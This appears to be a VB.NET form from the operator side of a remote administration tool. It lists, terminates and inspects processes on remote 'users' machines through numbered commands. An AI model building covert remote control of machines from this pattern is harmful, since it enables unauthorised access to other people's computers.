Public Class Processmanager

    Private Sub ButtonRefreshProcesses_Click(sender As Object, e As EventArgs) Handles ButtonRefreshProcesses.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting processlist...")
        ListViewProcesses.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|5")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
        End Try
    End Sub

    Public Sub SplitData(ByVal Data As String)
        If Data = Nothing Then
            MsgBox("Formatting Failed. Please Retry.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        Dim lines() = Data.Split({";;;"}, StringSplitOptions.None)
        For Each line In lines
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item = ListViewProcesses.Items.Add(parts(0), 0)
            For i = 1 To Math.Min(parts.Length - 1, 2)
                Dim PIDcheck As String = parts(i)
                item.SubItems.Add(parts(i))
                If item.SubItems(i).Text.EndsWith("*") Then
                    item.ImageIndex = 1
                    item.ForeColor = Color.Red
                    item.SubItems(1).Text = item.SubItems(1).Text.Replace("*", String.Empty)
                Else
                    item.ImageIndex = 0
                    item.SubItems.Add(parts(i))
                End If


            Next
        Next

        For Each item As ListViewItem In ListViewProcesses.Items
            If (String.IsNullOrWhiteSpace(item.Text) Or String.IsNullOrEmpty(item.Text)) Then
                item.Remove()
            End If
        Next
    End Sub

    Private Sub Processmanager_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        ListViewProcesses.Items.Clear()
    End Sub

    Private Sub StartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartProcessToolStripMenuItem.Click
        ProcessmanagerStartProcess.ShowDialog()
    End Sub

    Private Sub TerminateProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TerminateProcessToolStripMenuItem.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Terminating process...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewProcesses.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewProcesses.SelectedItems(0).SubItems(1).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|7")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
                End Try
            End If
        Else
            MsgBox("Select a process to terminate.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub GetModulesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetModulesToolStripMenuItem.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Me.ListViewProcesses.SelectedItems.Count > 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
                Try
                    Main.WriteData(ListViewProcesses.SelectedItems(0).SubItems(1).Text)
                    Main.WriteCommand(Main.SelectedUserID & "|8")
                    Waiting.ShowDialog()
                Catch x As Exception
                    MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
                End Try
            End If
        Else
            MsgBox("Select a process to load the modules from.", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub ListViewProcesses_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListViewProcesses.SelectedIndexChanged

    End Sub

    Private Sub Processmanager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class